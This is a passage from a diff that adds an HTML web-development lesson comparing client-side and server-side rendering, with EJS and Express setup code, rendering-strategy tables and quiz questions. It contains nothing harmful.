+      <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span>Cargo Pants — ₹1,499<span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
+      <span class="token-flag">&lt;li</span><span class="token-flag">&gt;</span>Denim Jacket — ₹2,299<span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>
+    <span class="token-flag">&lt;/ul</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;/body</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/html</span><span class="token-flag">&gt;</span></pre></div>
+        </div>
+      </div>
+
+      <h3>Race to first paint</h3>
+      <p>Step through what happens when a user opens the page. Watch when each side first shows real content.</p>
+
+      <div class="stepper" id="race">
+        <p class="stepper-caption" id="race-caption"></p>
+        <div class="lanes">
+          <div class="lane">
+            <div class="lane-head"><span class="badge badge-blue">CSR · React SPA</span><span class="lane-status" id="csr-status"></span></div>
+            <div class="browser"><div class="browser-bar"><i></i><i></i><i></i><span id="csr-url">shop.com/products</span></div><div class="browser-body" id="csr-screen"></div></div>
+            <div class="wire"><span class="node">Browser</span><div class="wire-mid"><span class="wire-label" id="csr-label"></span><svg viewBox="0 0 200 8" preserveAspectRatio="none" aria-hidden="true"><line id="csr-line" x1="0" y1="4" x2="200" y2="4"/></svg></div><span class="node">Server</span></div>
+            <p class="lane-log" id="csr-log"></p>
+          </div>
+          <div class="lane">
+            <div class="lane-head"><span class="badge badge-accent">SSR · Express + EJS</span><span class="lane-status" id="ssr-status"></span></div>
+            <div class="browser"><div class="browser-bar"><i></i><i></i><i></i><span id="ssr-url">shop.com/products</span></div><div class="browser-body" id="ssr-screen"></div></div>
+            <div class="wire"><span class="node">Browser</span><div class="wire-mid"><span class="wire-label" id="ssr-label"></span><svg viewBox="0 0 200 8" preserveAspectRatio="none" aria-hidden="true"><line id="ssr-line" x1="0" y1="4" x2="200" y2="4"/></svg></div><span class="node">Server</span></div>
+            <p class="lane-log" id="ssr-log"></p>
+          </div>
+        </div>
+        <div class="stepper-controls">
+          <button type="button" class="step-btn" id="race-back">← Back</button>
+          <div class="step-dots" id="race-dots" aria-hidden="true"></div>
+          <span class="step-counter" id="race-counter" aria-live="polite"></span>
+          <button type="button" class="step-btn primary" id="race-next">Forward →</button>
+        </div>
+      </div>
+
+      <h3>Side by side</h3>
+      <div class="table-wrap">
+      <table class="compare-table">
+        <thead><tr><th>What</th><th>CSR (React + Vite)</th><th>SSR (Express + EJS)</th></tr></thead>
+        <tbody>
+          <tr><td class="cell-title">Who builds the HTML</td><td class="cell-muted">The browser, using JavaScript</td><td class="cell-highlight">The server, before sending ✓</td></tr>
+          <tr><td class="cell-title">First response contains</td><td class="cell-muted">An empty <code>&lt;div id="root"&gt;</code> + script tags</td><td class="cell-highlight">The complete page with data ✓</td></tr>
+          <tr><td class="cell-title">First content visible</td><td class="cell-muted">After HTML + JS download + JS runs + API call</td><td class="cell-highlight">As soon as the HTML arrives ✓</td></tr>
+          <tr><td class="cell-title">SEO & link previews</td><td class="cell-muted">Bots may see an empty page</td><td class="cell-highlight">Bots see real content ✓</td></tr>
+          <tr><td class="cell-title">Moving between pages</td><td class="cell-highlight">Instant — only JSON is fetched ✓</td><td class="cell-muted">Full page reload every time</td></tr>
+          <tr><td class="cell-title">Rich interactivity</td><td class="cell-highlight">Components, state, smooth UI ✓</td><td class="cell-muted">Needs extra hand-written JS</td></tr>
+          <tr><td class="cell-title">Work done by</td><td class="cell-muted">The user's device</td><td class="cell-muted">Your server, on every request</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">In server-side rendering, where does the final HTML (with the data already inside) get built?</p><div class="quiz-options" id="quiz-ssr-1"><button type="button" onclick="answerQuiz('quiz-ssr-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; In the browser, after JavaScript runs</button><button type="button" onclick="answerQuiz('quiz-ssr-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; On the server, before the response is sent</button></div><div class="quiz-feedback hidden" id="quiz-ssr-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">You open View Page Source on your Vite + React app and see only <code>&lt;div id="root"&gt;&lt;/div&gt;</code>. Which rendering is this?</p><div class="quiz-options" id="quiz-ssr-2"><button type="button" onclick="answerQuiz('quiz-ssr-2', this, true)" class="quiz-option">A &nbsp;—&nbsp; Client-side rendering (CSR)</button><button type="button" onclick="answerQuiz('quiz-ssr-2', this, false)" class="quiz-option">B &nbsp;—&nbsp; Server-side rendering (SSR)</button></div><div class="quiz-feedback hidden" id="quiz-ssr-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 02 CSR problems ═════════════ -->
+    <section class="section-block animate-fade-up" id="csr-problems">
+      <div class="section-header">
+        <div class="section-num-big">02</div>
+        <div class="section-header-text">
+          <div class="section-title">The Problems with Client-Side Rendering</div>
+          <div class="section-subtitle">Why the industry started moving HTML back to the server</div>
+        </div>
+      </div>
+
+      <p>Every React + Vite app you have built so far is CSR. It is great for app-like experiences — dashboards, chat, editors — but it comes with real costs that show up as your app and your audience grow.</p>
+
+      <h3>1 · The blank screen</h3>
+      <p>Until JavaScript downloads, runs, and gets data back from the API, the user is staring at a white screen (or a spinner). Every step below has to finish before the next one starts — this chain is called a <strong>request waterfall</strong>.</p>
+      <div class="scale-diagram">
+        <span class="highlight">GET /products</span> → index.html arrives (empty <code>#root</code>)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;↓ <span class="red">screen: blank</span><br>
+        <span class="highlight">download bundle.js</span> (React + your code + every library)<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;↓ <span class="red">screen: blank</span><br>
+        <span class="highlight">parse & run JS</span> → React mounts, shows a spinner<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;↓ <span class="red">screen: spinner</span><br>
+        <span class="highlight">fetch('/api/products')</span> → wait for JSON<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;↓<br>
+        <span class="green">render the list → user finally sees content ✅</span>
+      </div>
+      <p>And it often gets worse: a component renders, <em>then</em> fetches its data, then its child renders and fetches <em>its</em> data. Each level adds another round trip.</p>
+
+      <h3>2 · Slow on budget phones and patchy networks</h3>
+      <p>In CSR, the <strong>user's device</strong> does the rendering work. On a fast laptop with Wi-Fi you won't notice. On a budget Android phone on spotty mobile data — which is a lot of your real users in India — a big bundle means seconds of waiting before anything appears.</p>
+
+      <h3>3 · SEO and link previews</h3>
+      <p>Search engines and social apps read your HTML to understand a page. With CSR the raw HTML has no content and the same <code>&lt;title&gt;</code> on every route.</p>
+      <ul>
+        <li><strong>Google</strong> can run JavaScript, but it does it in a delayed second pass. Content that depends on JS gets indexed slower and less reliably.</li>
+        <li><strong>Link preview bots</strong> (WhatsApp, LinkedIn, X, Slack, Discord) mostly read the raw HTML and don't run JavaScript. Share your CSR product page and the preview shows a generic title with no product image.</li>
+      </ul>
+
+      <h3>4 · Nothing works without JavaScript</h3>
+      <p>If the bundle fails to load — a network blip, a CDN issue, a script error in production — the user sees nothing at all. With SSR, the content is already in the HTML, so the page is still readable.</p>
+
+      <h3>5 · Bundles keep growing</h3>
+      <p>Every library you <code>npm install</code> for the frontend (charts, date pickers, animation, icons) ships to every user. Bundle size creeps up release after release, and so does the blank-screen time.</p>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>SSR isn't free either.</strong> Your server does work on every request, every navigation is a full page reload, and rich interactivity needs extra JavaScript. That's why modern frameworks don't pick one side — they mix both (Section 4).</p>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Why do WhatsApp and LinkedIn link previews often show a generic title for a CSR app?</p><div class="quiz-options" id="quiz-csr-1"><button type="button" onclick="answerQuiz('quiz-csr-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; Their preview bots read the raw HTML and usually don't run JavaScript</button><button type="button" onclick="answerQuiz('quiz-csr-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; WhatsApp blocks links to React websites</button></div><div class="quiz-feedback hidden" id="quiz-csr-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">What is a "request waterfall" in a CSR app?</p><div class="quiz-options" id="quiz-csr-2"><button type="button" onclick="answerQuiz('quiz-csr-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; Many requests fired in parallel at the same moment</button><button type="button" onclick="answerQuiz('quiz-csr-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; Each step waits for the one before it: HTML → JS → data → render</button></div><div class="quiz-feedback hidden" id="quiz-csr-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 03 How EJS works ═════════════ -->
+    <section class="section-block animate-fade-up" id="how-ejs-works">
+      <div class="section-header">
+        <div class="section-num-big">03</div>
+        <div class="section-header-text">
+          <div class="section-title">How EJS Works</div>
+          <div class="section-subtitle">One template, endless pages — and why modern products moved beyond it</div>
+        </div>
+      </div>
+
+      <div class="concept-box">
+        <div class="concept-box-label">Key Concept</div>
+        <p class="concept-box-text"><strong>EJS (Embedded JavaScript)</strong> is a templating engine for Node.js. You write normal HTML and drop JavaScript inside special <code>&lt;% %&gt;</code> tags. On every request, the server runs the template with your data and produces a plain HTML string. <strong>The browser never sees EJS</strong> — only the finished HTML.</p>
+      </div>
+
+      <p>When you open Swiggy, there isn't a separate HTML file for every user. There is one template, and your name, orders and address get filled into it before the page is sent. That's templating.</p>
+
+      <h3>The journey of one request</h3>
+      <div class="flow-diagram">
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">Browser requests GET /products</div><div class="flow-desc">A normal HTTP request — a link click, typing the URL, or submitting a form.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">Your route handler gets the data</div><div class="flow-desc">Query MongoDB, call a service, read the session — exactly like any other route.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title"><code>res.render('products', { products })</code></div><div class="flow-desc">Instead of <code>res.json()</code>, you hand the data to a template.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">EJS compiles the template into a JS function</div><div class="flow-desc">It reads <code>views/products.ejs</code> and turns it into a function. With <code>NODE_ENV=production</code>, Express caches compiled views so this happens once.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">The function runs with your data → HTML string</div><div class="flow-desc">Loops run, conditions are checked, values are escaped and pasted in.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-green"></div></div>
+          <div class="flow-content"><div class="flow-title">Express sends it as text/html → browser paints</div><div class="flow-desc">The response is a complete page. No JSON, no fetch, no bundle needed to see content.</div></div></div>
+      </div>
+
+      <h3>What EJS turns your template into</h3>
+      <p>There's no magic. EJS converts your template into a function that builds a string. A simplified version:</p>
+      <div class="code-pair">
+        <div>
+          <div class="pair-label"><span class="badge badge-blue">You write</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/hello.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span>Hello <span class="token-operator">&lt;%=</span> name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (isAdmin) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;a</span> href=<span class="token-string">"/admin"</span><span class="token-flag">&gt;</span>Admin panel<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+        </div>
+        <div>
+          <div class="pair-label"><span class="badge badge-gold">EJS builds (simplified)</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">compiled function</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-yaml-key">function</span> <span class="token-command">template</span>(locals) {
+  <span class="token-yaml-key">let</span> html = <span class="token-string">''</span>;
+  html += <span class="token-string">'&lt;h1&gt;Hello '</span>;
+  html += <span class="token-command">escape</span>(locals.name);
+  html += <span class="token-string">'&lt;/h1&gt;\n'</span>;
+  <span class="token-yaml-key">if</span> (locals.isAdmin) {
+    html += <span class="token-string">'&lt;a href="/admin"&gt;Admin panel&lt;/a&gt;\n'</span>;
+  }
+  <span class="token-yaml-key">return</span> html;
+}</pre></div>
+        </div>
+      </div>
+      <p>Text outside the tags is copied as it is. Code inside <code>&lt;% %&gt;</code> becomes real JavaScript. That's why you can use any JS you already know — <code>if</code>, <code>for</code>, <code>.map()</code>, <code>toUpperCase()</code> — inside a template.</p>
+
+      <h3>So why don't modern products use EJS?</h3>
+      <p>EJS is SSR in its simplest form. It solves the blank-screen and SEO problems well. But the products you use every day — Swiggy, Instagram, Notion — need things classic templating can't give easily:</p>
+      <div class="table-wrap">
+      <table class="compare-table">
+        <thead><tr><th>Need</th><th>Classic EJS</th><th>Modern frameworks (Next.js etc.)</th></tr></thead>
+        <tbody>
+          <tr><td class="cell-title">Moving between pages</td><td class="cell-muted">Every click reloads the whole page</td><td class="cell-highlight">Client-side navigation, no full reload ✓</td></tr>
+          <tr><td class="cell-title">Interactive UI</td><td class="cell-muted">Write separate vanilla JS and wire the DOM by hand</td><td class="cell-highlight">Components with state ✓</td></tr>
+          <tr><td class="cell-title">Reusable UI</td><td class="cell-muted">Partials only — no props, state or lifecycle</td><td class="cell-highlight">Component ecosystem (UI kits, forms, charts) ✓</td></tr>
+          <tr><td class="cell-title">Web + mobile app</td><td class="cell-muted">HTML is useless to an Android app — you still need a JSON API</td><td class="cell-highlight">One API serves web and mobile ✓</td></tr>
+          <tr><td class="cell-title">Team structure</td><td class="cell-muted">Views and backend logic in one Express app</td><td class="cell-highlight">Frontend and backend teams ship independently ✓</td></tr>
+          <tr><td class="cell-title">Type safety</td><td class="cell-muted">Templates aren't type-checked; typos fail at runtime</td><td class="cell-highlight">TypeScript across components ✓</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h3>Where EJS still makes sense</h3>
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Use case</th><th>Why EJS fits</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">Email templates</span></td><td>"Hi Riya, your order #4521 is confirmed." Render the HTML with <code>ejs.renderFile()</code> and send it with Nodemailer. Emails can't run React anyway.</td></tr>
+          <tr><td><span class="flag-name">Admin panels</span></td><td>Internal tools that just list users, orders and metrics. No separate frontend project to build and deploy.</td></tr>
+          <tr><td><span class="flag-name">Invoices & PDFs</span></td><td>Render an invoice as HTML, then convert it to PDF with a headless browser like Puppeteer.</td></tr>
+          <tr><td><span class="flag-name">Simple content sites</span></td><td>Blogs, docs, landing pages where content matters more than interactivity.</td></tr>
+          <tr><td><span class="flag-name">Learning SSR</span></td><td>It's the clearest way to see what Next.js does under the hood: data in, HTML out, on the server.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Does the browser ever receive EJS tags like <code>&lt;%= name %&gt;</code>?</p><div class="quiz-options" id="quiz-ejs-1"><button type="button" onclick="answerQuiz('quiz-ejs-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Yes — the browser runs them</button><button type="button" onclick="answerQuiz('quiz-ejs-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; No — the server turns them into plain HTML first</button></div><div class="quiz-feedback hidden" id="quiz-ejs-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Which of these is a good fit for EJS today?</p><div class="quiz-options" id="quiz-ejs-2"><button type="button" onclick="answerQuiz('quiz-ejs-2', this, true)" class="quiz-option">A &nbsp;—&nbsp; Personalised order-confirmation emails</button><button type="button" onclick="answerQuiz('quiz-ejs-2', this, false)" class="quiz-option">B &nbsp;—&nbsp; A real-time collaborative editor like Figma</button></div><div class="quiz-feedback hidden" id="quiz-ejs-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 04 Modern rendering ═════════════ -->
+    <section class="section-block animate-fade-up" id="modern-rendering">
+      <div class="section-header">
+        <div class="section-num-big">04</div>
+        <div class="section-header-text">
+          <div class="section-title">How Rendering Works Today</div>
+          <div class="section-subtitle">SSR for the first paint, CSR for interactivity — the best of both</div>
+        </div>
+      </div>
+
+      <p>Modern frameworks don't force you to pick SSR <em>or</em> CSR. The usual pattern: render the HTML on the server so the first paint is fast and SEO works, then let JavaScript take over in the browser so the app feels smooth.</p>
+
+      <h3>Rendering strategies you'll hear about</h3>
+      <div class="table-wrap">
+      <table class="compare-table">
+        <thead><tr><th>Strategy</th><th>When the HTML is built</th><th>Great for</th></tr></thead>
+        <tbody>
+          <tr><td class="cell-title">CSR</td><td class="cell-muted">In the browser, after JS runs</td><td class="cell-muted">Dashboards and apps behind a login, where SEO doesn't matter</td></tr>
+          <tr><td class="cell-title">SSR</td><td class="cell-muted">On the server, on every request</td><td class="cell-muted">Personalised or always-changing pages: feeds, carts, search results</td></tr>
+          <tr><td class="cell-title">SSG <span class="cell-muted">(Static Site Generation)</span></td><td class="cell-muted">Once, at build time</td><td class="cell-muted">Blogs, docs, marketing pages — served instantly from a CDN</td></tr>
+          <tr><td class="cell-title">ISR <span class="cell-muted">(Incremental Static Regeneration)</span></td><td class="cell-muted">At build time, then rebuilt in the background every N seconds</td><td class="cell-muted">Product pages: mostly static, updated now and then</td></tr>
+          <tr><td class="cell-title">Streaming SSR</td><td class="cell-muted">On the server, sent in chunks as each part is ready</td><td class="cell-muted">Pages where one slow section shouldn't block the rest</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h3>Three ideas that make it work</h3>
+      <div class="concept-box">
+        <div class="concept-box-label">Hydration</div>
+        <p class="concept-box-text">The server sends ready HTML (fast first paint). Then the browser downloads the React code and <strong>attaches event handlers and state to that existing HTML</strong>. The page becomes interactive without being rebuilt from scratch.</p>
+      </div>
+      <div class="concept-box">
+        <div class="concept-box-label">React Server Components</div>
+        <p class="concept-box-text">Some components run <strong>only on the server</strong> — they can query the database directly and send zero JavaScript to the browser. Only interactive parts (buttons, forms, modals) ship JS. This is the default in the Next.js App Router.</p>
+      </div>
+      <div class="concept-box">
+        <div class="concept-box-label">Islands architecture</div>
+        <p class="concept-box-text">The page is static HTML, with small <strong>islands</strong> of interactivity (a carousel, a cart button) that load their own JS. Popularised by Astro — ideal for content-heavy sites.</p>
+      </div>
+
+      <h3>What teams use for SSR today</h3>
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Framework</th><th>Built on</th><th>Known for</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">Next.js</span></td><td><span class="flag-val">React</span></td><td>The most common choice in React jobs. SSR, SSG, ISR, streaming and Server Components in one framework.</td></tr>
+          <tr><td><span class="flag-name">React Router</span></td><td><span class="flag-val">React</span></td><td>"Framework mode" is what used to be Remix: server loaders and actions, built around standard web forms.</td></tr>
+          <tr><td><span class="flag-name">TanStack Start</span></td><td><span class="flag-val">React</span></td><td>Type-safe routing with server functions and streaming SSR.</td></tr>
+          <tr><td><span class="flag-name">Nuxt</span></td><td><span class="flag-val">Vue</span></td><td>The Next.js equivalent for Vue.</td></tr>
+          <tr><td><span class="flag-name">SvelteKit</span></td><td><span class="flag-val">Svelte</span></td><td>Small bundles, SSR by default.</td></tr>
+          <tr><td><span class="flag-name">Astro</span></td><td><span class="flag-val">any UI library</span></td><td>Content sites. Ships zero JS by default and uses islands for interactive parts.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <p>Look how close the mental model is to what you're learning today. Both fetch data on the server and return finished HTML:</p>
+      <div class="code-pair">
+        <div>
+          <div class="pair-label"><span class="badge badge-accent">Express + EJS</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">routes/products.js</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">app.<span class="token-command">get</span>(<span class="token-string">'/products'</span>, <span class="token-yaml-key">async</span> (req, res) <span class="token-operator">=&gt;</span> {
+  <span class="token-yaml-key">const</span> products = <span class="token-yaml-key">await</span> Product.<span class="token-command">find</span>();
+  res.<span class="token-command">render</span>(<span class="token-string">'products'</span>, { products });
+});</pre></div>
+        </div>
+        <div>
+          <div class="pair-label"><span class="badge badge-blue">Next.js Server Component</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">app/products/page.jsx</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-yaml-key">export</span> <span class="token-yaml-key">default</span> <span class="token-yaml-key">async</span> <span class="token-yaml-key">function</span> <span class="token-command">ProductsPage</span>() {
+  <span class="token-yaml-key">const</span> products = <span class="token-yaml-key">await</span> Product.<span class="token-command">find</span>();
+  <span class="token-yaml-key">return</span> (
+    <span class="token-flag">&lt;ul</span><span class="token-flag">&gt;</span>
+      {products.<span class="token-command">map</span>(p <span class="token-operator">=&gt;</span> <span class="token-flag">&lt;li</span> key={p.id}<span class="token-flag">&gt;</span>{p.name}<span class="token-flag">&lt;/li</span><span class="token-flag">&gt;</span>)}
+    <span class="token-flag">&lt;/ul</span><span class="token-flag">&gt;</span>
+  );
+}</pre></div>
+        </div>
+      </div>
+
+      <h3>Making CSR faster (when you stay with React + Vite)</h3>
+      <p>Not every app needs SSR. A dashboard behind a login doesn't care about SEO. For those, you optimise the CSR side:</p>
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Technique</th><th>What it does</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">Code splitting</span></td><td>Split the bundle per route with <code>React.lazy()</code> + dynamic <code>import()</code>. Users only download the page they open.</td></tr>
+          <tr><td><span class="flag-name">Skeleton screens</span></td><td>Show the shape of the page while data loads. It doesn't make things faster, but it <em>feels</em> faster than a spinner.</td></tr>
+          <tr><td><span class="flag-name">Data caching</span></td><td>TanStack Query or SWR cache API responses, so going back to a page doesn't refetch everything.</td></tr>
+          <tr><td><span class="flag-name">Prefetching</span></td><td>Load the next page's code and data when the user hovers over a link, before they click.</td></tr>
+          <tr><td><span class="flag-name">CDN for assets</span></td><td>Serve the JS bundle and images from servers close to the user.</td></tr>
+          <tr><td><span class="flag-name">Lighter bundles</span></td><td>Import only what you use, replace heavy libraries, lazy-load images with <code>loading="lazy"</code> and serve WebP/AVIF.</td></tr>
+        </tbody>
+      </table>
+      </div>
+<div class="code-block"><div class="code-header"><span class="code-label">App.jsx — route-level code splitting</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-yaml-key">import</span> { lazy, Suspense } <span class="token-yaml-key">from</span> <span class="token-string">'react'</span>;
+
+<span class="token-comment">// Dashboard code is downloaded only when this route is visited</span>
+<span class="token-yaml-key">const</span> Dashboard = <span class="token-command">lazy</span>(() <span class="token-operator">=&gt;</span> <span class="token-yaml-key">import</span>(<span class="token-string">'./pages/Dashboard'</span>));
+
+<span class="token-yaml-key">export</span> <span class="token-yaml-key">default</span> <span class="token-yaml-key">function</span> <span class="token-command">App</span>() {
+  <span class="token-yaml-key">return</span> (
+    <span class="token-flag">&lt;Suspense</span> fallback={<span class="token-flag">&lt;DashboardSkeleton</span> <span class="token-flag">/&gt;</span>}<span class="token-flag">&gt;</span>
+      <span class="token-flag">&lt;Dashboard</span> <span class="token-flag">/&gt;</span>
+    <span class="token-flag">&lt;/Suspense</span><span class="token-flag">&gt;</span>
+  );
+}</pre></div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">What does hydration mean?</p><div class="quiz-options" id="quiz-modern-1"><button type="button" onclick="answerQuiz('quiz-modern-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; The browser attaches JavaScript (event handlers, state) to HTML the server already rendered</button><button type="button" onclick="answerQuiz('quiz-modern-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; The server re-sends the full HTML every few seconds</button></div><div class="quiz-feedback hidden" id="quiz-modern-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Your blog posts rarely change and must load fast for everyone. Which strategy fits best?</p><div class="quiz-options" id="quiz-modern-2"><button type="button" onclick="answerQuiz('quiz-modern-2', this, true)" class="quiz-option">A &nbsp;—&nbsp; SSG — build the HTML once at build time and serve it from a CDN</button><button type="button" onclick="answerQuiz('quiz-modern-2', this, false)" class="quiz-option">B &nbsp;—&nbsp; CSR — fetch the posts with JavaScript after the page loads</button></div><div class="quiz-feedback hidden" id="quiz-modern-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 05 Setup ═════════════ -->
+    <section class="section-block animate-fade-up" id="setup">
+      <div class="section-header">
+        <div class="section-num-big">05</div>
+        <div class="section-header-text">
+          <div class="section-title">Setting Up EJS</div>
+          <div class="section-subtitle">From an empty folder to your first server-rendered page</div>
+        </div>
+      </div>
+
+      <div class="step-row"><span class="badge badge-accent">Step 1 — Create the project</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">Terminal</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-command">mkdir</span> <span class="token-val">ejs-demo</span> <span class="token-operator">&amp;&amp;</span> <span class="token-command">cd</span> <span class="token-val">ejs-demo</span>
+<span class="token-command">npm</span> <span class="token-val">init</span> <span class="token-flag">-y</span>
+<span class="token-command">npm</span> <span class="token-val">install</span> <span class="token-val">express</span> <span class="token-val">ejs</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-accent">Step 2 — Folder structure</span></div>
+      <p>Express looks for templates in a <code>views</code> folder. Static files (CSS, images, browser JS) go in <code>public</code>.</p>
+<div class="code-block"><div class="code-header"><span class="code-label">Project structure</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">ejs-demo/
+├── app.js
+├── package.json
+├── public/              ← served as-is to the browser
+│   └── css/
+│       └── style.css
+└── views/               ← EJS templates (never sent raw)
+    ├── home.ejs
+    └── partials/        ← reusable pieces (Section 10)</pre></div>
+
+      <div class="step-row"><span class="badge badge-accent">Step 3 — Tell Express to use EJS</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">app.js</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-yaml-key">const</span> express = <span class="token-yaml-key">require</span>(<span class="token-string">'express'</span>);
+<span class="token-yaml-key">const</span> path = <span class="token-yaml-key">require</span>(<span class="token-string">'path'</span>);
+
+<span class="token-yaml-key">const</span> app = <span class="token-command">express</span>();
+
+<span class="token-comment">// 1. Use EJS as the template engine</span>
+app.<span class="token-command">set</span>(<span class="token-string">'view engine'</span>, <span class="token-string">'ejs'</span>);
+
+<span class="token-comment">// 2. Where the templates live</span>
+app.<span class="token-command">set</span>(<span class="token-string">'views'</span>, path.<span class="token-command">join</span>(__dirname, <span class="token-string">'views'</span>));
+
+<span class="token-comment">// 3. Serve CSS, images and browser JS from /public</span>
+app.<span class="token-command">use</span>(express.<span class="token-command">static</span>(path.<span class="token-command">join</span>(__dirname, <span class="token-string">'public'</span>)));
+
+app.<span class="token-command">get</span>(<span class="token-string">'/'</span>, (req, res) <span class="token-operator">=&gt;</span> {
+  res.<span class="token-command">render</span>(<span class="token-string">'home'</span>, { name: <span class="token-string">'Ankur'</span> });
+});
+
+app.<span class="token-command">listen</span>(<span class="token-val">3000</span>, () <span class="token-operator">=&gt;</span> {
+  console.<span class="token-command">log</span>(<span class="token-string">'Server running on http://localhost:3000'</span>);
+});</pre></div>
+
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Setting</th><th>Value used</th><th>What it does</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">view engine</span></td><td><span class="flag-val">'ejs'</span></td><td>Which engine renders templates. It also lets you write <code>res.render('home')</code> without the <code>.ejs</code> extension.</td></tr>
+          <tr><td><span class="flag-name">views</span></td><td><span class="flag-val">path.join(__dirname, 'views')</span></td><td>Folder where templates live. The default is <code>views</code> inside the folder you ran <code>node</code> from — setting it explicitly avoids "Failed to lookup view" errors.</td></tr>
+          <tr><td><span class="flag-name">express.static</span></td><td><span class="flag-val">'public'</span></td><td>Files in <code>public</code> are served directly: <code>public/css/style.css</code> → <code>/css/style.css</code>.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>You never write <code>require('ejs')</code>.</strong> Express loads it for you based on the view engine name. You only need it installed.</p>
+      </div>
+
+      <div class="step-row"><span class="badge badge-accent">Step 4 — Your first template</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/home.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;!DOCTYPE html&gt;</span>
+<span class="token-flag">&lt;html</span> lang=<span class="token-string">"en"</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;head</span><span class="token-flag">&gt;</span>
